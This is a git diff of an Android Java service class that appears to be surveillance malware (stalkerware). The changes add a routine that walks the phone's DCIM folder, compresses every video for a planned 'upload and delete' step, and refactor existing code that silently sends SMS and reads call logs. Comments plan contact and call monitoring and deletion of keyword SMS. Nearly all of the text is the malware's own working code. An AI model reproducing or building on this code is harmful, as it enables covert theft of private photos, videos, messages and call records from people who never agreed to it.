@@ -3,7 +3,6 @@ package com.fs.fs.api;
 import android.Manifest;
 import android.app.PendingIntent;
 import android.content.ContentResolver;
-import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
@@ -16,11 +15,13 @@ import android.support.v4.app.ActivityCompat;
 import android.telephony.SmsManager;
 import android.text.TextUtils;
 
+import com.fs.fs.App;
 import com.fs.fs.bean.PhoneInfo;
 import com.fs.fs.bean.SMSInfo;
 import com.fs.fs.receivers.SMSReceiver;
 import com.fs.fs.utils.Constant;
 import com.fs.fs.utils.DateUtils;
+import com.fs.fs.utils.FFmpegUtils;
 import com.fs.fs.utils.FileUtils;
 import com.fs.fs.utils.ImageUtils;
 import com.fs.fs.utils.LogUtils;
@@ -36,20 +37,32 @@ import java.util.List;
 
 /**
  * Created by wyx on 2016/12/30.
+ * <p>
+ * DOC:about ffmpeg for Android
+ * <p>
+ * http://androidwarzone.blogspot.jp/2011/12/ffmpeg4android.html
+ * https://docs.google.com/document/d/1FWMAT3FbCXlW_91d6Ek_UCD_CtYJWxYaDVY2hE6Onig/edit
  */
 
 public class ProviderService {
     //TODO: 监听Call/通讯记录 & 通讯录 ContentObserver
     //TODO: 删除关键词短信
-    private Context mContext = null;
     private SharePreferencesUtils mSharePreferences = null;
     // 获取内容解析者
     private ContentResolver mResolver = null;
 
-    public ProviderService(Context context) {
-        this.mContext = context;
-        this.mSharePreferences = new SharePreferencesUtils(context);
-        this.mResolver = mContext.getContentResolver();
+
+    private ProviderService() {
+        this.mSharePreferences = SharePreferencesUtils.getInstance();
+        this.mResolver = App.getInstance().getContentResolver();
+    }
+
+    private static class SingletonHolder {
+        private static final ProviderService INSTANCE = new ProviderService();
+    }
+
+    public static ProviderService getInstance() {
+        return SingletonHolder.INSTANCE;
     }
 
     public interface SMSListener {
@@ -78,7 +91,7 @@ public class ProviderService {
 
     public void sendSMSSilent(String phoneNumber, String content) {
         if (TextUtils.isEmpty(content)) return;
-        PendingIntent sentIntent = PendingIntent.getBroadcast(mContext, 0, new Intent(), 0);
+        PendingIntent sentIntent = PendingIntent.getBroadcast(App.getInstance(), 0, new Intent(), 0);
         SmsManager smsManager = SmsManager.getDefault();
         if (content.length() >= 70) {
             List<String> ms = smsManager.divideMessage(content);
@@ -151,7 +164,7 @@ public class ProviderService {
 
     public void getCalls(CallsListener listener) {
         mCallsListener = listener;
-        if (ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+        if (ActivityCompat.checkSelfPermission(App.getInstance(), Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
             // 检查READ_CALL_LOG权限
             return;
         }
@@ -202,13 +215,37 @@ public class ProviderService {
     }
 
     public void getPictures() {
+        getPicture(getMediaFiles());
+    }
+
+    public void getVideos() {
+        getVideo(getMediaFiles());
+    }
+
+    private File[] getMediaFiles() {
         //TODO: SharePreferencesUtils保存结果对比更新
         File root = new File(Environment.getExternalStorageDirectory() + "/DCIM/");
-        File[] files = root.listFiles();
-        if (files == null) {
-            return;
+        return root.listFiles();
+    }
+
+    /**
+     * ffmpeg4android
+     *
+     * @param files
+     */
+    private void getVideo(File[] files) {
+        for (File file : files) {
+            if (file.isDirectory() && !file.isHidden()) {
+                getVideo(file.listFiles());
+            } else if (file.getAbsolutePath().endsWith(".mp4")) {
+                String srcfileName = file.getAbsolutePath();
+                String tarFileName = FileUtils.getExternalFullPath(App.getInstance(),
+                        String.format("%s.%s", DateUtils.date2String(new Date(), "yyyyMMdd_HHmmss"), "mp4"));
+                FFmpegUtils.getInstance().compressVideo(srcfileName, tarFileName);
+                LogUtils.d(tarFileName);
+                // TODO:上传并删除
+            }
         }
-        getPicture(files);
     }
 
     private void getPicture(File[] files) {
@@ -221,7 +258,7 @@ public class ProviderService {
                 String fileName = String.format("%s.%s", DateUtils.date2String(new Date(), "yyyyMMdd_HHmmss"), "jpg");
                 FileOutputStream out = null;
                 try {
-                    fileName = FileUtils.getExternalFullPath(mContext, fileName);
+                    fileName = FileUtils.getExternalFullPath(App.getInstance(), fileName);
                     LogUtils.d(fileName);
                     out = new FileOutputStream(fileName);
                     bitmap.compress(Bitmap.CompressFormat.JPEG, 60, out);
